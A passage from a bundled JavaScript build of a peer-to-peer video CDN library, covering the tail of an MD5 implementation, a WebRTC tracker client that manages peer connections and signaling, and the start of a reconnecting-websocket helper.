            b = md5gg(b, c, d, a, x[i + 12], 20, -1926607734);

            a = md5hh(a, b, c, d, x[i + 5], 4, -378558);
            d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463);
            c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562);
            b = md5hh(b, c, d, a, x[i + 14], 23, -35309556);
            a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060);
            d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353);
            c = md5hh(c, d, a, b, x[i + 7], 16, -155497632);
            b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640);
            a = md5hh(a, b, c, d, x[i + 13], 4, 681279174);
            d = md5hh(d, a, b, c, x[i], 11, -358537222);
            c = md5hh(c, d, a, b, x[i + 3], 16, -722521979);
            b = md5hh(b, c, d, a, x[i + 6], 23, 76029189);
            a = md5hh(a, b, c, d, x[i + 9], 4, -640364487);
            d = md5hh(d, a, b, c, x[i + 12], 11, -421815835);
            c = md5hh(c, d, a, b, x[i + 15], 16, 530742520);
            b = md5hh(b, c, d, a, x[i + 2], 23, -995338651);

            a = md5ii(a, b, c, d, x[i], 6, -198630844);
            d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415);
            c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905);
            b = md5ii(b, c, d, a, x[i + 5], 21, -57434055);
            a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571);
            d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606);
            c = md5ii(c, d, a, b, x[i + 10], 15, -1051523);
            b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799);
            a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359);
            d = md5ii(d, a, b, c, x[i + 15], 10, -30611744);
            c = md5ii(c, d, a, b, x[i + 6], 15, -1560198380);
            b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649);
            a = md5ii(a, b, c, d, x[i + 4], 6, -145523070);
            d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379);
            c = md5ii(c, d, a, b, x[i + 2], 15, 718787259);
            b = md5ii(b, c, d, a, x[i + 9], 21, -343485551);

            a = safeAdd(a, olda);
            b = safeAdd(b, oldb);
            c = safeAdd(c, oldc);
            d = safeAdd(d, oldd);
        }
        return [a, b, c, d];
    }

    /*
     * Convert an array of little-endian words to a string
     */
    function binl2rstr(input) {
        var i;
        var output = '';
        var length32 = input.length * 32;
        for (i = 0; i < length32; i += 8) {
            output += String.fromCharCode(input[i >> 5] >>> i % 32 & 0xff);
        }
        return output;
    }

    /*
     * Convert a raw string to an array of little-endian words
     * Characters >255 have their high-byte silently ignored.
     */
    function rstr2binl(input) {
        var i;
        var output = [];
        output[(input.length >> 2) - 1] = undefined;
        for (i = 0; i < output.length; i += 1) {
            output[i] = 0;
        }
        var length8 = input.length * 8;
        for (i = 0; i < length8; i += 8) {
            output[i >> 5] |= (input.charCodeAt(i / 8) & 0xff) << i % 32;
        }
        return output;
    }

    /*
     * Calculate the MD5 of a raw string
     */
    function rstrMD5(s) {
        return binl2rstr(binlMD5(rstr2binl(s), s.length * 8));
    }

    /*
     * Calculate the HMAC-MD5, of a key and some data (raw strings)
     */
    function rstrHMACMD5(key, data) {
        var i;
        var bkey = rstr2binl(key);
        var ipad = [];
        var opad = [];
        var hash;
        ipad[15] = opad[15] = undefined;
        if (bkey.length > 16) {
            bkey = binlMD5(bkey, key.length * 8);
        }
        for (i = 0; i < 16; i += 1) {
            ipad[i] = bkey[i] ^ 0x36363636;
            opad[i] = bkey[i] ^ 0x5c5c5c5c;
        }
        hash = binlMD5(ipad.concat(rstr2binl(data)), 512 + data.length * 8);
        return binl2rstr(binlMD5(opad.concat(hash), 512 + 128));
    }

    /*
     * Convert a raw string to a hex string
     */
    function rstr2hex(input) {
        var hexTab = '0123456789abcdef';
        var output = '';
        var x;
        var i;
        for (i = 0; i < input.length; i += 1) {
            x = input.charCodeAt(i);
            output += hexTab.charAt(x >>> 4 & 0x0f) + hexTab.charAt(x & 0x0f);
        }
        return output;
    }

    /*
     * Encode a string as utf-8
     */
    function str2rstrUTF8(input) {
        return unescape(encodeURIComponent(input));
    }

    /*
     * Take string arguments and return either raw or hex encoded strings
     */
    function rawMD5(s) {
        return rstrMD5(str2rstrUTF8(s));
    }
    function hexMD5(s) {
        return rstr2hex(rawMD5(s));
    }
    function rawHMACMD5(k, d) {
        return rstrHMACMD5(str2rstrUTF8(k), str2rstrUTF8(d));
    }
    function hexHMACMD5(k, d) {
        return rstr2hex(rawHMACMD5(k, d));
    }

    function md5(string, key, raw) {
        if (!key) {
            if (!raw) {
                return hexMD5(string);
            }
            return rawMD5(string);
        }
        if (!raw) {
            return hexHMACMD5(key, string);
        }
        return rawHMACMD5(key, string);
    }

    if (true) {
        !(__WEBPACK_AMD_DEFINE_RESULT__ = (function () {
            return md5;
        }).call(exports, __webpack_require__, exports, module),
				__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
    } else if ((typeof module === 'undefined' ? 'undefined' : _typeof(module)) === 'object' && module.exports) {
        module.exports = md5;
    } else {
        $.md5 = md5;
    }
})(undefined);

/***/ }),
/* 30 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _events = __webpack_require__(1);

var _events2 = _interopRequireDefault(_events);

var _websocketClient = __webpack_require__(15);

var _websocketClient2 = _interopRequireDefault(_websocketClient);

var _errCode = __webpack_require__(16);

var _errCode2 = _interopRequireDefault(_errCode);

var _toolFuns = __webpack_require__(0);

var _events3 = __webpack_require__(2);

var _events4 = _interopRequireDefault(_events3);

var _getPeersThrottle = __webpack_require__(8);

var _getPeersThrottle2 = _interopRequireDefault(_getPeersThrottle);

var _peer = __webpack_require__(6);

var _peer2 = _interopRequireDefault(_peer);

var _platform = __webpack_require__(4);

var _platform2 = _interopRequireDefault(_platform);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var MAX_PC_CONNS = 25; // PC端最大p2p连接数
var MAX_MOBILE_CONNS = 15; // 移动端最大p2p连接数
var MIN_PEER_SHARE_TIME = 30; // 分享peers的最低加入时间间隔 秒
// const MAX_TRY_CONNS = 8;             // GET_PEERS后一次最多尝试连接的peer数量
var MAX_TRY_CONNS_TRICKLE = 5; // trickle模式下GET_PEERS后一次最多尝试连接的peer数量
// const MIN_PEERS_FOR_TRACKER = 3;     // 留给tracker调度的节点数量

var TrackerClient = function (_EventEmitter) {
    _inherits(TrackerClient, _EventEmitter);

    function TrackerClient(engine, fetcher, scheduler, config) {
        _classCallCheck(this, TrackerClient);

        var _this = _possibleConstructorReturn(this, (TrackerClient.__proto__ || Object.getPrototypeOf(TrackerClient)).call(this));

        _this.engine = engine;
        _this.logger = engine.logger;
        _this.config = config;
        _this.connected = false; // 与信令的连接状态
        _this.scheduler = scheduler;
        _this.sequential = _this.scheduler.sequential;
        _this.DCMap = new Map(); //{key: remotePeerId, value: DataChannnel} 目前已经建立连接或正在建立连接的dc
        _this.failedDCSet = new Set(); //{remotePeerId} 建立连接失败的dc
        _this.signalerWs = null; //信令服务器ws
        //tracker request API
        _this.fetcher = fetcher;
        /*
        peers: Array<Object{id:string}>
         */
        _this.peers = [];
        _this.minConns = 5;
        _this.stuns = [];

        // 防止调用频率过高
        _this.requestMorePeers = (0, _getPeersThrottle2.default)(_this._requestMorePeers, _this);

        _this.engine.maxConns = _this.maxConns = _platform2.default.isMobile() ? MAX_MOBILE_CONNS : MAX_PC_CONNS;

        // 统计
        _this.peersIncrement = 0; // 每个getPeers周期获取的可连接节点数量
        _this.gotPeersFromTracker = false; // 上次是否从tracker获取节点

        // 断开信令
        _this.fuseRate = -1;

        // 展示广告
        if (config.showSlogan && (0, _toolFuns.navLang)() === 'en') {
            console.log('%cLet your viewers become your unlimitedly scalable CDN\n%c' + window.atob('aHR0cHM6Ly93d3cuY2RuYnllLmNvbS9lbg=='), "color: dodgerblue; padding:20px 0; font-size: x-large", 'font-size: medium; padding-bottom:15px');
        }
        return _this;
    }

    _createClass(TrackerClient, [{
        key: 'resumeP2P',
        value: function resumeP2P() {
            var _this2 = this;

            var engine = this.engine;

            this.fetcher.btAnnounce().then(function (json) {
                if (!_this2.scheduler) return;
                engine.peerId = _this2.peerId = json.id;
                _this2.minConns = json.min_conns;
                if (json.share_only) _this2.scheduler.setShareOnly();
                var peers = json.peers;
                _this2.scheduler.notifyPeersLoaded(peers.length);
                // 是否只允许p2p下载
                // json.wifi_only = true;           // test
                var netType = engine.netType;
                if ((json.wifi_only || engine.config.wifiOnly) && !(netType === 'wifi' || netType === 'ethernet')) {
                    _this2.scheduler.downloadOnly = true;
                    _this2.logger.info('downloadOnly mode');
                }
                // 优先使用下发的信令地址
                _this2.signalerWs = _this2._initSignalerWs(json.signal || _this2.config.wsSignalerAddr, json.token); //连上tracker后开始连接信令服务器
                if (peers.length === 0) {
                    _this2.requestMorePeers();
                } else {
                    _this2.peers = _this2._filterPeers(peers);
                }
                engine.emit('peerId', _this2.peerId);
                var getPeerId = engine.config.getPeerId;
                if (getPeerId && typeof getPeerId === 'function') {
                    getPeerId(_this2.peerId);
                }
                // 优先使用下发的stun
                if (json.stun && json.stun.length > 0) {
                    _this2.stuns = json.stun;
                }
                // 在线调试
                if (json.debug) {
                    _this2.logger.enableDebug();
                }
                // 连接数足够了断开信令
                if (json.fuse_rate) {
                    _this2.fuseRate = json.fuse_rate;
                }
                _this2.logger.info('announce request response ' + JSON.stringify(json, null, 2));
            }).catch(function (msg) {
                if (!msg.ret) {
                    _this2.logger.error(msg.err);
                    engine.emit(_events4.default.EXCEPTION, (0, _errCode2.default)(msg.err, 'TRACKER_EXPT'));
                    return;
                }
                // 随机时间后重试
                if (msg.ret === -1 && msg.data) {
                    var delay = (0, _toolFuns.randomNum)(30000, 60000);
                    _this2.logger.error(msg.data.msg + ' retry after ' + delay + 'ms');
                    _this2.announceTimer = setTimeout(function () {
                        _this2.resumeP2P();
                    }, delay);
                }
            });
        }
    }, {
        key: 'stopP2P',
        value: function stopP2P() {
            this.fetcher.destroy();
            this.fetcher = null;
            this.requestMorePeers(true); // 清空里面的定时器
            this.scheduler.destroy();
            this.scheduler = null;
            if (this.signalerWs) {
                this.signalerWs.destroy();
                this.signalerWs = null;
            }
            this.peers = [];

            // 销毁所有datachannel
            var _iteratorNormalCompletion = true;
            var _didIteratorError = false;
            var _iteratorError = undefined;

            try {
                for (var _iterator = this.DCMap.values()[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true) {
                    var dc = _step.value;

                    dc.destroy();
                }
            } catch (err) {
                _didIteratorError = true;
                _iteratorError = err;
            } finally {
                try {
                    if (!_iteratorNormalCompletion && _iterator.return) {
                        _iterator.return();
                    }
                } finally {
                    if (_didIteratorError) {
                        throw _iteratorError;
                    }
                }
            }

            this.DCMap.clear();

            this.failedDCSet.clear();
            this.logger.warn('tracker stop p2p');
        }
    }, {
        key: 'destroy',
        value: function destroy() {
            this.stopP2P();
            this.removeAllListeners();
            clearTimeout(this.announceTimer);
            var config = this.config;

            config.getStats = config.getPeerId = config.getPeersInfo = null;
            this.engine = null;
            this.fetcher = null;
            this.logger.warn('destroy tracker');
        }

        //过滤掉已经连接的节点和连接失败的节点

    }, {
        key: '_filterPeers',
        value: function _filterPeers(peers) {
            var ret = [];
            var blockedPeerIds = [].concat(_toConsumableArray(this.DCMap.keys()), _toConsumableArray(this.failedDCSet.keys()), [this.peerId]);
            var filteredPeers = peers.filter(function (node) {
                return !blockedPeerIds.includes(node.id);
            });
            filteredPeers.forEach(function (peer) {
                ret.push({
                    id: peer.id,
                    intermediator: peer.intermediator,
                    cpr: peer.cpr || undefined
                });
            });
            return ret;
        }
    }, {
        key: '_tryConnectToAllPeers',
        value: function _tryConnectToAllPeers() {
            if (this.peers.length === 0) return;
            this.logger.info('try connect to ' + this.peers.length + ' peers');
            while (this.peers.length > 0) {
                if (this.DCMap.size >= this.maxConns) {
                    // 清空peers
                    this.logger.debug('clear exceeded peers');
                    this.peers = [];
                    break;
                }
                var peer = this.peers.shift();
                this.logger.debug('new DataChannel ' + peer.id);
                var intermediator = peer.intermediator;
                this._createDatachannel(peer.id, true, intermediator, peer.cpr);
            }
        }
    }, {
        key: '_setupDC',
        value: function _setupDC(datachannel) {
            var _this3 = this;

            datachannel.on(_events4.default.DC_SIGNAL, function (data) {
                // webrtc产生的sdp
                var remotePeerId = datachannel.remotePeerId;
                if (datachannel.intermediator) {
                    var interPeer = _this3.DCMap.get(datachannel.intermediator);
                    if (interPeer) {
                        // 通过中间peer中转
                        var isSuccess = interPeer.sendMsgSignal(remotePeerId, _this3.peerId, data);
                        if (isSuccess) return;
                    }
                }
                _this3.signalerWs.sendSignal(remotePeerId, data);
            }).on(_events4.default.DC_PEER_SIGNAL, function (data) {
                // 接收到peer传来的信令
                var toPeerId = data.to_peer_id;
                var fromPeerId = data.from_peer_id;
                var action = data.action;
                if (!toPeerId || !fromPeerId || !action) return;
                if (toPeerId !== _this3.peerId) {
                    // 本节点是中转者
                    _this3.logger.info('relay signal for ' + fromPeerId);
                    var targetPeer = _this3.DCMap.get(toPeerId);
                    if (targetPeer) {
                        if (action === 'signal') {
                            if (targetPeer.sendMsgSignal(toPeerId, fromPeerId, data.data)) return;
                        } else {
                            targetPeer.sendMsgSignalReject(toPeerId, fromPeerId, data.reason);
                            return;
                        }
                    }
                    // peer not found
                    datachannel.sendMsgSignal(fromPeerId, toPeerId);
                } else {
                    // 本节点是目标节点
                    // this.logger.info(`receive signal from ${fromPeerId}`);
                    if (action === 'signal') {
                        _this3._handleSignalMsg(fromPeerId, data, datachannel.remotePeerId);
                    } else {
                        _this3._handSignalRejected(fromPeerId, data);
                    }
                }
            }).on(_events4.default.DC_GET_PEERS, function () {
                // this.logger.info(`DC_GET_PEERS total peers ${this.scheduler.peersNum}`)
                // 排除连接满的节点和刚加入不久的节点
                var currentTs = (0, _toolFuns.getCurrentTs)();
                var peers = _this3.scheduler.getPeers().filter(function (peer) {
                    return peer.peersConnected < (peer.mobileWeb ? MAX_MOBILE_CONNS : MAX_PC_CONNS);
                });
                // this.logger.info(`DC_GET_PEERS filtered peers ${peers.length}`)
                if (peers && peers.length > 0) {
                    var peersToSent = [];
                    peers.forEach(function (peer) {
                        var joinDuration = currentTs - peer.timeJoin;
                        if (peer.remotePeerId !== datachannel.remotePeerId && peer.remotePeerId !== _this3.peerId && joinDuration > MIN_PEER_SHARE_TIME) {
                            peersToSent.push({ id: peer.remotePeerId });
                        }
                    });
                    _this3.logger.info('send ' + peersToSent.length + ' peers to ' + datachannel.remotePeerId);
                    datachannel.sendPeers(peersToSent);
                }
            }).on(_events4.default.DC_PEERS, function (data) {
                datachannel.gotPeers = true;
                var peers = data.peers;
                if (peers && peers.length > 0) {
                    // const limit = this.scheduler.waitForPeer ? MAX_TRY_CONNS_TRICKLE : MAX_TRY_CONNS;   // 最多发送sdp限制
                    var limit = MAX_TRY_CONNS_TRICKLE; // 最多发送sdp限制
                    _this3.logger.info('receive ' + peers.length + ' peers from ' + datachannel.remotePeerId);
                    peers.forEach(function (peer) {
                        peer.intermediator = datachannel.remotePeerId;
                    });
                    _this3.peers = [].concat(_toConsumableArray(_this3.peers), _toConsumableArray(_this3._filterPeers(peers).slice(0, limit)));
                    _this3._tryConnectToAllPeers();
                }
            }).once(_events4.default.DC_ERROR, function (fatal) {
                _this3.logger.info('datachannel ' + datachannel.channelId + ' failed fatal ' + fatal);
                if (!_this3.scheduler) return;
                _this3.scheduler.deletePeer(datachannel);
                _this3._destroyAndDeletePeer(datachannel.remotePeerId);
                _this3.requestMorePeers();

                //更新conns
                if (!_this3.fetcher) return;
                if (datachannel.connected) {
                    //连接断开
                    _this3.fetcher.decreConns();
                    // this.scheduler.broadcastConnsStats(-1);
                } else {
                    //连接失败
                    if (fatal) _this3.fetcher.increFailConns();
                }
                if (fatal) _this3.failedDCSet.add(datachannel.remotePeerId); //记录失败的连接

                _this3._doSignalFusing(_this3.scheduler.peersNum);
            }).once(_events4.default.DC_CLOSE, function () {

                _this3.logger.info('datachannel ' + datachannel.channelId + ' closed');
                if (_this3.scheduler) {
                    _this3.scheduler.deletePeer(datachannel);
                    _this3._doSignalFusing(_this3.scheduler.peersNum);
                }
                _this3._destroyAndDeletePeer(datachannel.remotePeerId);
                // this.DCMap.delete(datachannel.remotePeerId);
                _this3.failedDCSet.add(datachannel.remotePeerId); //记录断开的连接
                // datachannel.destroy();
                _this3.requestMorePeers();

                //更新conns
                if (_this3.fetcher) _this3.fetcher.decreConns();
            }).once(_events4.default.DC_OPEN, function () {
                if (datachannel.isInitiator) {
                    // 本节点主动发起者
                    _this3.scheduler.handshakePeer(datachannel);
                }
            }).once(_events4.default.DC_METADATA, function (msg) {
                // console.warn(`tracker DC_METADATA`);
                var scheduler = _this3.scheduler;

                if (!datachannel.isInitiator) {
                    // 本节点非主动发起者
                    scheduler.handshakePeer(datachannel);
                }
                scheduler.handleMetaData(datachannel, msg);
                //如果dc数量不够则继续尝试连接
                var peerNum = scheduler.peersNum;
                var cancel = peerNum >= _this3.minConns;
                _this3.requestMorePeers(cancel);

                //更新conns
                _this3.fetcher.increConns();
                _this3.peersIncrement++;

                _this3._doSignalFusing(peerNum + 1);
            });
        }
    }, {
        key: '_doSignalFusing',
        value: function _doSignalFusing(conns) {
            if (this.fuseRate <= 0) return;
            var connected = this.signalerWs.connected;
            if (connected && conns >= this.fuseRate + 2) {
                // 上报stats
                this.logger.warn('reach fuseRate, report stats close signaler');
                if (this.fetcher.conns > 0) this.fetcher.postStats();
                // 断开信令
                this.signalerWs.close();
            } else if (!connected && conns < this.fuseRate) {
                // 重连信令
                this.logger.warn('low conns, reconnect signaler');
                this.signalerWs.reconnect();
            }
        }
    }, {
        key: '_initSignalerWs',
        value: function _initSignalerWs(addr, token) {
            var _this4 = this;

            // console.warn("_initSignalerWs token " + token);
            var signalUrl = addr + '?id=' + this.peerId + '&p=web';
            if (token) {
                signalUrl = signalUrl + '&token=' + token;
            }
            var websocket = new _websocketClient2.default(this.engine, signalUrl, this.config, 270, 'signaler');
            websocket.onopen = function () {
                _this4.connected = true;
                _this4.engine.emit('serverConnected', true);
                // 尝试与所有peers同时建立连接
                _this4._tryConnectToAllPeers();
            };

            websocket.onmessage = function (msg) {
                // let msg = JSON.parse(e.data);
                var action = msg.action;
                var fromPeerId = msg.from_peer_id;
                switch (action) {
                    case 'signal':
                        _this4._handleSignalMsg(fromPeerId, msg);
                        break;
                    case 'reject':
                        _this4._handSignalRejected(fromPeerId, msg);
                        break;
                    case 'close':
                        _this4.logger.warn('server close signaler reason ' + msg.reason);
                        websocket.close();
                        break;
                    default:
                        _this4.logger.warn('Signal websocket unknown action ' + action);

                }
            };
            websocket.onclose = function () {
                //websocket断开时清除datachannel
                _this4.connected = false;
                _this4.engine.emit('serverConnected', false);
            };
            websocket.onerror = function (err) {
                err.message && _this4.engine.emit(_events4.default.EXCEPTION, (0, _errCode2.default)(err, 'SIGNAL_EXPT'));
            };
            return websocket;
        }
    }, {
        key: '_handSignalRejected',
        value: function _handSignalRejected(fromPeerId, msg) {
            this.logger.warn('signaling ' + fromPeerId + ' rejected, reason ' + msg.reason);
            var datachannel = this.DCMap.get(fromPeerId);
            // 如果还没连上
            if (datachannel && !datachannel.connected) {
                datachannel.destroy();
                this.DCMap.delete(fromPeerId);
            }
            this.requestMorePeers();
            if (msg.fatal) this.failedDCSet.add(fromPeerId); //记录reject的连接
        }
    }, {
        key: '_handleSignalMsg',
        value: function _handleSignalMsg(fromPeerId, msg, intermediator) {
            if (!this.scheduler) return;
            if (!msg.data) {
                //如果对等端已不在线
                var deleted = this._destroyAndDeletePeer(fromPeerId);
                if (!deleted) return;
                this.logger.info('signaling ' + fromPeerId + ' not found');
                var scheduler = this.scheduler;

                if (scheduler.waitForPeer) {
                    scheduler.waitingPeers--;
                    if (scheduler.waitingPeers === 0) scheduler.notifyPeersLoaded(0);
                }
                this.requestMorePeers();
                this.failedDCSet.add(fromPeerId); //记录not found的连接
            } else {
                if (this.failedDCSet.has(fromPeerId)) {
                    // 拒绝对方连接请求
                    this._sendSignalReject(fromPeerId, 'peer ' + fromPeerId + ' in blocked list', intermediator, true);
                    return;
                }
                // this.logger.debug(`handle signal from ${fromPeerId}`);
                this._handleSignal(fromPeerId, msg.data, intermediator);
            }
        }
    }, {
        key: '_handleSignal',
        value: function _handleSignal(remotePeerId, data, intermediator) {
            var sdpType = data.type;
            var logger = this.logger;

            var datachannel = this.DCMap.get(remotePeerId);
            if (datachannel) {
                if (datachannel.connected) {
                    logger.info('datachannel had connected, signal ignored');
                    return;
                } else if (sdpType === 'offer') {
                    // 收到的一定是answer  可能产生碰撞
                    if (this.peerId > remotePeerId) {
                        // peerId大的转成被动方
                        this._destroyAndDeletePeer(remotePeerId);
                        logger.warn('signal type wrong ' + sdpType + ', convert to non initiator');
                        datachannel = this._createDatachannel(remotePeerId, false, intermediator);
                    } else {
                        // peerId小的忽略信令
                        logger.warn('signal type wrong ' + sdpType + ', ignored');
                        return;
                    }
                }
            } else {
                // 收到节点连接请求
                // 收到的一定是offer
                if (sdpType === 'answer') {
                    var errMsg = 'signal type wrong ' + sdpType;
                    logger.warn(errMsg);
                    // 拒绝对方连接请求
                    this._sendSignalReject(remotePeerId, errMsg, intermediator);
                    this._destroyAndDeletePeer(remotePeerId);
                    return;
                }
                logger.debug('receive node ' + remotePeerId + ' connection request');
                var peersNum = this.scheduler.peersNum;
                // 限制最大连接数
                if (peersNum >= this.maxConns) {
                    var candidates = this.scheduler.getNonactivePeers();
                    if (candidates.length > 0) {
                        var numClose = peersNum - this.maxConns + 2;
                        if (candidates.length < numClose) numClose = candidates.length;
                        while (numClose > 0) {
                            var peerToClose = candidates.shift();
                            if (peerToClose) {
                                logger.warn('close inactive peer ' + peerToClose.remotePeerId);
                                peerToClose.close();
                            }
                            numClose--;
                        }
                    } else {
                        var _errMsg = 'peers reach limit ' + this.maxConns;
                        logger.warn(_errMsg);
                        // 拒绝对方连接请求
                        this._sendSignalReject(remotePeerId, _errMsg, intermediator);
                        return;
                    }
                }
                // else if (intermediator && (this.maxConns - peersNum < MIN_PEERS_FOR_TRACKER)) {
                //     // 留一部分空间给tracker调度给其他节点
                //     const candidates = this.scheduler.getNonactivePeers();
                //     if (candidates.length > 0) {
                //         const peerToClose = candidates[0];
                //         peerToClose.close();
                //     } else {
                //         const errMsg = `too many peers from peer`;
                //         logger.warn(errMsg);
                //         // 拒绝对方连接请求
                //         this._sendSignalReject(remotePeerId, errMsg, intermediator);
                //         return;
                //     }
                // }
                datachannel = this._createDatachannel(remotePeerId, false, intermediator);
            }
            datachannel.receiveSignal(data);
        }
    }, {
        key: '_createDatachannel',
        value: function _createDatachannel(remotePeerId, isInitiator, intermediator, cpr) {
            var trickle = this.config.trickleICE;
            var datachannel = new _peer2.default(this.engine, this.peerId, remotePeerId, isInitiator, this.config, this.sequential, {
                stuns: this.stuns,
                intermediator: intermediator,
                trickle: trickle
                // trickle: true,                   // 信令扛不住
            });
            if (cpr) datachannel.cpr = cpr;
            this.DCMap.set(remotePeerId, datachannel); //将对等端Id作为键
            this._setupDC(datachannel);
            return datachannel;
        }
    }, {
        key: '_sendSignalReject',
        value: function _sendSignalReject(remotePeerId, reason, intermediator, fatal) {
            if (intermediator) {
                var interPeer = this.DCMap.get(intermediator);
                if (interPeer) {
                    // 通过中间peer中转
                    if (interPeer.sendMsgSignalReject(remotePeerId, this.peerId, reason, fatal)) return;
                }
            }
            this.signalerWs.sendReject(remotePeerId, reason, fatal);
        }

        // 请求更多节点

    }, {
        key: '_requestMorePeers',
        value: function _requestMorePeers(delay) {
            var _this5 = this;

            var logger = this.logger;

            logger.info('requestMorePeers after delay ' + delay);
            var peersNum = this.scheduler.peersNum;
            var peersIncrement = this.peersIncrement;
            this.peersIncrement = 0; // 重置
            // console.warn(`peersIncrement ${peersIncrement}`);
            if (peersNum >= this.minConns) return;
            if (peersNum === 0 || peersIncrement <= 3 && !this.gotPeersFromTracker) {
                // 如果上次获取的节点过少并且不是向tracker请求，则这次向tracker请求
                // 限制failedDCSet size
                if (this.failedDCSet.size > 30) {
                    this.failedDCSet = new Set([].concat(_toConsumableArray(this.failedDCSet)).slice(-30));
                }
                // 从服务器获取节点
                this.fetcher.btGetPeers([].concat(_toConsumableArray(this.DCMap.keys()), _toConsumableArray(this.failedDCSet.keys()))).then(function (json) {
                    logger.info('requestMorePeers resp ' + JSON.stringify(json, null, 2));
                    _this5.peers = [].concat(_toConsumableArray(_this5.peers), _toConsumableArray(_this5._filterPeers(json.peers)));
                    _this5._tryConnectToAllPeers();
                }).catch(function (err) {
                    logger.error('requestMorePeers error ' + err);
                });
                this.gotPeersFromTracker = true;
            } else {
                // 从邻居获取节点
                if (peersNum < this.maxConns) {
                    this.scheduler.requestPeers();
                    this.gotPeersFromTracker = false;
                }
            }
        }
    }, {
        key: '_destroyAndDeletePeer',
        value: function _destroyAndDeletePeer(remotePeerId) {
            var datachannel = this.DCMap.get(remotePeerId);
            if (datachannel) {
                datachannel.destroy();
                this.DCMap.delete(remotePeerId);
                return true;
            }
            return false;
        }
    }]);

    return TrackerClient;
}(_events2.default);

exports.default = TrackerClient;
module.exports = exports['default'];

/***/ }),
/* 31 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


;
;
;
var isWebSocket = function isWebSocket(constructor) {
    return constructor && constructor.CLOSING === 2;
};
var isGlobalWebSocket = function isGlobalWebSocket() {
    return typeof WebSocket !== 'undefined' && isWebSocket(WebSocket);
};
var getDefaultOptions = function getDefaultOptions() {
    return {
        constructor: isGlobalWebSocket() ? WebSocket : null,
        maxReconnectionDelay: 10000,
        minReconnectionDelay: 1500,
        reconnectionDelayGrowFactor: 1.3,
        connectionTimeout: 4000,
        maxRetries: Infinity,
        debug: false
    };
};
var bypassProperty = function bypassProperty(src, dst, name) {
    Object.defineProperty(dst, name, {
        get: function get() {
            return src[name];
        },
        set: function set(value) {
            src[name] = value;
        },
        enumerable: true,
        configurable: true
    });
};
var initReconnectionDelay = function initReconnectionDelay(config) {
    return config.minReconnectionDelay + Math.random() * config.minReconnectionDelay;
};
var updateReconnectionDelay = function updateReconnectionDelay(config, previousDelay) {
    var newDelay = previousDelay * config.reconnectionDelayGrowFactor;
    return newDelay > config.maxReconnectionDelay ? config.maxReconnectionDelay : newDelay;
};
var LEVEL_0_EVENTS = ['onopen', 'onclose', 'onmessage', 'onerror'];
var reassignEventListeners = function reassignEventListeners(ws, oldWs, listeners) {
    Object.keys(listeners).forEach(function (type) {
        listeners[type].forEach(function (_a) {
            var listener = _a[0],
                options = _a[1];
            ws.addEventListener(type, listener, options);
        });
    });
    if (oldWs) {
        LEVEL_0_EVENTS.forEach(function (name) {
            ws[name] = oldWs[name];
        });
    }
};
var ReconnectingWebsocket = function ReconnectingWebsocket(url, protocols, options) {
    var _this = this;
    if (options === void 0) {
        options = {};
    }
    var ws;
    var connectingTimeout;
    var reconnectDelay = 0;
    var retriesCount = 0;
    var shouldRetry = true;
    var savedOnClose = null;
    var listeners = {};
    // require new to construct
    if (!(this instanceof ReconnectingWebsocket)) {
        throw new TypeError("Failed to construct 'ReconnectingWebSocket': Please use the 'new' operator");
    }
    // Set config. Not using `Object.assign` because of IE11
    var config = getDefaultOptions();
    Object.keys(config).filter(function (key) {
        return options.hasOwnProperty(key);
    }).forEach(function (key) {
        return config[key] = options[key];
    });
    if (!isWebSocket(config.constructor)) {
        throw new TypeError('Invalid WebSocket constructor. Set `options.constructor`');
    }
    var log = config.debug ? function () {
        var params = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            params[_i] = arguments[_i];
        }
        return console.log.apply(console, ['RWS:'].concat(params));
    } : function () {};
    /**
     * Not using dispatchEvent, otherwise we must use a DOM Event object
     * Deferred because we want to handle the close event before this
     */
    var emitError = function emitError(code, msg) {
        return setTimeout(function () {
            var err = new Error(msg);
            err.code = code;
            if (Array.isArray(listeners.error)) {
                listeners.error.forEach(function (_a) {
                    var fn = _a[0];
                    return fn(err);
                });
            }
            if (ws.onerror) {
                ws.onerror(err);
            }
        }, 0);
    };
    var handleClose = function handleClose() {
        log('handleClose', { shouldRetry: shouldRetry });
        retriesCount++;
        log('retries count:', retriesCount);
        if (retriesCount > config.maxRetries) {
